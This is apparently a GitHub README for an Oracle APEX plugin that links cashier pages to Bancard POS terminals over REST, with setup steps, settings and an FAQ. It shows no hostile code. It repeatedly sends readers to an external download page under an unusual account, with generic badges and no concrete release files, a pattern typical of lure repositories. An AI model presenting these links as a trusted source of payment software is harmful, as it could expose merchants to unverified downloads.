# Bancard POS Plugin for Oracle APEX - Payment Integration 2026

> **Bancard POS Plugin links Oracle APEX cashier screens to nearby Bancard terminals over REST, with support for several payment operations and configurable asynchronous response processing.**

[![Platform](https://img.shields.io/badge/Platform-Oracle%20APEX-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hilljordansfg9345/bancard-pos-apex-plugin?style=flat-square)](https://github.com/hilljordansfg9345/bancard-pos-apex-plugin)

---

<p align="center">
  <a href="https://hilljordansfg9345.github.io/bancard-pos-apex-plugin/">
    <img src="https://img.shields.io/badge/Download-Bancard%20POS%20Plugin%20Latest-brightgreen?style=for-the-badge" alt="Download Bancard POS Plugin">
  </a>
</p>

> **[Download Bancard POS Plugin](https://hilljordansfg9345.github.io/bancard-pos-apex-plugin/)**

---

[Download Latest Build](https://hilljordansfg9345.github.io/bancard-pos-apex-plugin/)

---

## Overview

Bancard POS Plugin adds an Oracle APEX Dynamic Action for launching payments from a cashier's browser. It sends REST requests to a Bancard terminal on the local network, allowing an APEX application to communicate with supported POS payment flows without routing the request through an intermediate application server.

The integration is intended for Oracle APEX solutions operating with Paraguay-based Bancard environments. Terminal responses can be assigned to selected APEX page items, while change events provide a way for the surrounding application to react to asynchronous payment outcomes.

---

## Capabilities

- Launch Bancard POS transactions from an Oracle APEX cashier page.
- Use REST to communicate with POS terminals on the local network.
- Handle card, QR, PIX, wallet, exchange, and redemption payment types.
- Verify terminal availability before sending a payment request.
- Assign returned payment data to configurable Oracle APEX page items.
- Emit change events for processing asynchronous transaction results.
- Use the included SweetAlert2 resource for payment notices and prompts.
- Develop and test with a dependency-free Python POS simulator.
- Explore the integration through a separate SmartPOS demo.
- Import dedicated plugin exports for Oracle APEX 20.2 and Oracle APEX 24.2.

---

## Getting Started

1. Obtain the current plugin package from the [download page](https://hilljordansfg9345.github.io/bancard-pos-apex-plugin/).
2. Choose the export that corresponds to the application's Oracle APEX release:
   - Oracle APEX 20.2
   - Oracle APEX 24.2
3. Open the target application in App Builder.
4. Import the provided plugin export.
5. Navigate to a page used for the cashier payment process, or create one.
6. Add the Bancard POS Dynamic Action and define the payment options and response mappings.
7. Make sure the browser running the cashier page can connect to the selected POS terminal over the local network.

For development and integration checks, the bundled Python simulator can substitute for a physical terminal. Consult the simulator files and their usage notes for the appropriate startup procedure.

---

## Payment Workflow

A normal setup in APEX follows these steps:

1. Add a button or another page control that initiates the payment.
2. Attach the Bancard POS Dynamic Action to that control.
3. Select the desired operation: card, QR, PIX, wallet, exchange, or redemption.
4. Enter the connection information for the local terminal.
5. Assign returned payment fields to the appropriate APEX page items.
6. Run the action from the cashier's browser.
7. Handle the response using the configured page-item change events.

The local simulator allows the flow to be tested before a real terminal is connected:

```bash
python simulator.py
```

The precise simulator command may depend on the package or export in use. Follow the included project files for the development utility's supported entry point.

---

## Dynamic Action Settings

Plugin options are managed through the Dynamic Action attributes in Oracle APEX. These settings generally cover the terminal endpoint, payment operation, response destinations, and event handling.

Example values can be arranged like this:

```text
Terminal URL:        http://<local-terminal-address>
Payment method:      card | QR | PIX | wallet | exchange | redemption
Response item:       P_PAYMENT_RESULT
Status item:         P_PAYMENT_STATUS
Change event:        Enabled
```

Ensure that every page item name matches an item on the target APEX page. Once mapped, the returned values are available to subsequent Dynamic Actions, validations, and application processes.

---

## Prerequisites

- Oracle APEX 20.2 or Oracle APEX 24.2, with the export that matches the installed version.
- A Bancard-compatible POS terminal when performing live payment tests.
- A network route between the cashier browser and the local POS terminal.
- An Oracle APEX application page prepared for the payment workflow.
- Python to run the dependency-free POS simulator.
- A browser that can execute the target Oracle APEX application.
- Adequate local storage and network capacity for the APEX application and its static plugin resources.

---

## Frequently Asked Questions

### What Oracle APEX releases can use the plugin?

The project supplies separate exports for Oracle APEX 20.2 and Oracle APEX 24.2. Select the export matching the version of the application where the plugin will be installed.

### Is a remote application server required for terminal communication?

No intermediate application server is part of the intended payment path. The cashier browser communicates with the local POS terminal through REST.

### Which transaction types can be selected?

The available payment profiles are card, QR, PIX, wallet, exchange, and redemption. The choices visible in a deployment may also depend on the terminal configuration and the application's workflow.

### How does APEX receive the terminal response?

The plugin can place raw terminal response values into configurable Oracle APEX page items. It also raises change events so asynchronous results can be handled by the application.

### Is physical POS hardware necessary for development?

No. A dependency-free Python POS simulator is included for development and integration testing, and the project also contains a standalone SmartPOS demonstration.

### What can I inspect when the terminal is unreachable?

Check the configured terminal address and REST settings, confirm that the browser and terminal can communicate across the required local network, and verify terminal availability before starting the transaction.

### Where are the integration options configured?

The main configuration is held in the Bancard POS Dynamic Action attributes, together with the Oracle APEX page item mappings used for returned values.

### Where can I find updated plugin exports?

Visit the [latest build](https://hilljordansfg9345.github.io/bancard-pos-apex-plugin/) and confirm that it matches the Oracle APEX version used by the application before importing an updated export.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
